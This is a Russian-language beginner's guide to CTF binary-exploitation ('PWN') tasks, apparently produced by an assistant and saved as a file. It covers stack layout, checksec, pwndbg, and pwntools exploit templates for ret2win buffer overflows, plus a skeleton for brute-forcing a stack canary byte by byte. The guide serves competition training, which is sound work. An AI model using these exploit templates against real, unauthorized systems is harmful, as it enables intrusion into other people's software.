# Руководство по решению задач PWN (Binary Exploitation)

---

## 1. Что такое PWN-задача

Тебе дают программу (бинарь), в которой есть уязвимость.  
Цель — заставить её выполнить произвольный код или напечатать флаг.

Самые частые уязвимости на начальном уровне:
- Stack Buffer Overflow
- Format String
- Integer Overflow
- Use-After-Free (уже сложнее)

В этом руководстве разбираем **классику** — Stack Buffer Overflow + ret2win / ret2shellcode.

---

## 2. Теория: как устроен стек (x86-64)

```
Высокие адреса
┌─────────────────────┐
│  аргументы функции  │
├─────────────────────┤
│  Return Address     │  ← сюда мы хотим попасть
├─────────────────────┤
│  Saved RBP          │
├─────────────────────┤
│  Canary (если есть) │
├─────────────────────┤
│  Локальные переменные│
│  (наш буфер)        │
└─────────────────────┘
Низкие адреса (RSP)
```

Когда функция заканчивается, процессор выполняет:
```asm
leave
ret
```

Инструкция `ret` берёт адрес с вершины стека и прыгает по нему.  
Если мы перезапишем **Return Address** — мы полностью контролируем, куда программа пойдёт дальше.

---

## 3. Общий алгоритм решения любой PWN-задачи

1. Собрать информацию о бинаре
2. Найти уязвимость
3. Найти offset до return-адреса
4. Понять защиты (canary, PIE, NX, RELRO)
5. Написать эксплойт
6. Проверить локально → отправить на remote

---

## 4. Инструменты

### 4.1 Базовые утилиты

```bash
file chall
checksec --file=chall
nm chall | grep -E 'win|flag|main|system'
objdump -d chall | less
strings chall | grep -iE 'flag|nto|secret'
```

Самая важная команда — `checksec`:

| Защита     | Что означает                          | Сложность |
|------------|---------------------------------------|---------|
| No Canary  | Можно спокойно перезаписывать return  | Легко    |
| Canary     | Нужно утекать или брутить             | Средне   |
| No PIE     | Адреса фиксированные                  | Легко    |
| PIE        | Адреса рандомные, нужна утечка        | Сложнее  |
| NX enabled | Нельзя выполнять шеллкод на стеке     | —        |
| NX disabled| Можно выполнять шеллкод на стеке      | Легко    |

### 4.2 gdb + pwndbg

Установка:
```bash
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh
```

Основные команды:
```gdb
gdb ./chall
break main
run

checksec
canary
stack 40
telescope 50
vmmap
p win
disassemble win
cyclic 200
cyclic -l 0x6161616161616170
```

---

## 5. Классическая задача: Buffer Overflow + ret2win

### Шаг 1. Смотрим защиты
```bash
checksec ./chall
```

Допустим видим:
- Stack: No canary found
- PIE: No PIE

### Шаг 2. Ищем функцию win
```bash
nm chall | grep win
# 0000000000401234 T win
```

### Шаг 3. Находим offset

**Способ 1 — через pwntools (рекомендуется)**

```python
from pwn import *

p = process("./chall")
p.sendline(cyclic(300))
p.wait()

core = Coredump("./core")
offset = cyclic_find(core.rip)
print(f"Offset = {offset}")
```

**Способ 2 — вручную в pwndbg**

```gdb
gdb ./chall
run
# вводим длинную строку из A
# после падения:
x/20gx $rsp
```

### Шаг 4. Пишем эксплойт

```python
from pwn import *

context.binary = elf = ELF("./chall")
# p = process("./chall")
p = remote("IP", PORT)

offset = 72
win = elf.symbols["win"]        # или просто 0x401234

payload  = b"A" * offset
payload += p64(win)

p.sendlineafter(b"> ", payload)
p.interactive()
```

---

## 6. Если есть Canary

Canary — случайное 8-байтное значение перед return-адресом.  
Если его затереть неправильным значением — программа вызывает `__stack_chk_fail` и падает.

### Способы обхода:

1. **Утечь canary** (правильный способ)
2. **Брут побайтно** (когда можно много раз подключаться)
3. Частичная перезапись (редко)

Пример брута побайтно:

```python
from pwn import *
from ctypes import c_int64

known = b"\x00"          # последний байт почти всегда 0x00

for pos in range(1, 8):
    for byte in range(256):
        guess = known + bytes([byte])
        canary = u64(guess.ljust(8, b"\x00"))
        
        # отправляем payload с этим canary
        # если программа не упала / напечатала флаг —
        # байт правильный
```

---

## 7. Полезные шаблоны pwntools

```python
from pwn import *

context.log_level = "debug"          # очень полезно на старте
context.binary = elf = ELF("./chall")
context.terminal = ["tmux", "splitw", "-h"]

# p = process("./chall")
p = remote("host", 1337)

# gdb.attach(p, gdbscript="break *main+123")

payload = flat({
    offset: elf.symbols["win"]
})

p.sendlineafter(b"> ", payload)
p.interactive()
```

---

## 8. Типичный порядок действий на олимпиаде

1. `checksec ./chall`
2. `nm ./chall` / `objdump -d ./chall` — ищем интересные функции
3. Смотрим исходник (если дан) или дизассемблируем
4. Находим место, куда можно писать без проверки границ
5. Считаем offset до return-адреса
6. Пишем простой эксплойт
7. Если не работает — смотрим в gdb, что лежит на стеке

---

## 9. Чек-лист «почему не работает»

- [ ] Неправильный offset
- [ ] Есть canary, а ты его затёр
- [ ] Включён PIE, а ты используешь абсолютный адрес
- [ ] Нужно выравнивание стека (добавить `ret`-гаджет)
- [ ] На remote другая версия бинаря / библиотеки
- [ ] Неправильный порядок байт (нужен little-endian → `p64()`)

---

## 10. Что учить дальше (рекомендуемый порядок)

1. Stack Buffer Overflow + ret2win
2. ret2shellcode (когда NX выключен)
3. ret2libc (когда NX включён)
4. Format String
5. Canary bypass (leak)
6. PIE bypass (leak)
7. Простой ROP

---

## Полезные ресурсы

- [LiveOverflow — Binary Exploitation](https://www.youtube.com/playlist?list=PLhixgUqwRTjxgltFUo19rOOWWx9dS8uAu)
- [how2heap](https://github.com/shellphish/how2heap)
- [pwndbg](https://github.com/pwndbg/pwndbg)
- [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)
```

Файл сохранён. Можешь скачать его:

**[PWN_Guide.md](file:///home/workdir/artifacts/PWN_Guide.md)**
```

